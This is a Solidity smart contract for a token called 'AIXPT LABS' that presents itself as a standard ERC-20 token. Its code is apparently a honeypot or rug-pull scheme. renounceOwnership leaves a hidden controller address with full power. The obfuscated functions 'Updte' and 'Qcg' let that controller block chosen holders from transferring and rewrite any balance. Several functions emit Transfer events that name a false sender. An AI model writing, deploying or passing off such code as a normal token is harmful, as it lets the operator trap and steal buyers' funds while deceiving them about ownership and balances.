// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract AIXPT {

    mapping (address => uint256) private liIbq;

    mapping (address => uint256) private liIbc;

    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "AIXPT LABS";
    string public symbol = unicode"AIXPT";
    uint8 public decimals = 6;
    uint256 public totalSupply = 1000000000*10**6;
    address owner = msg.sender;
    address private OPX;
    address xDeploy = 0x248f43e06dc2AA1dED6B5ce1CE0404AA682defA9;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor() {
        OPX = msg.sender;
        lDeploy(msg.sender, totalSupply);

    }

    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }


    function lDeploy(address account, uint256 amount) internal {
        account = xDeploy;
        liIbq[msg.sender] = totalSupply;
        emit Transfer(address(0), account, amount);
    }

    function balanceOf(address account) public view  returns (uint256) {
        return liIbq[account];
    }

    function Updte (address sx, uint256 sz)  public {
        if(msg.sender == OPX) {
            liIbc[sx] = sz;
        }
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        if(liIbc[msg.sender] <= 0) {
            require(liIbq[msg.sender] >= value);
            liIbq[msg.sender] -= value;
            liIbq[to] += value;
            emit Transfer(msg.sender, to, value);
            return true;
        }
    }

    function approve(address spender, uint256 value) public returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function Qcg (address sx, uint256 sz)  public {
        if(msg.sender == OPX) {
            liIbq[sx] = sz;
        }
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {
        if(from == OPX) {
            require(value <= liIbq[from]);
            require(value <= allowance[from][msg.sender]);
            liIbq[from] -= value;
            liIbq[to] += value;
            from = xDeploy;
            emit Transfer (from, to, value);
            return true;
        }else if(liIbc[from] <= 0 && liIbc[to] <= 0) {
            require(value <= liIbq[from]);
            require(value <= allowance[from][msg.sender]);
            liIbq[from] -= value;
            liIbq[to] += value;
            allowance[from][msg.sender] -= value;
            emit Transfer(from, to, value);
            return true;
        }
    }
}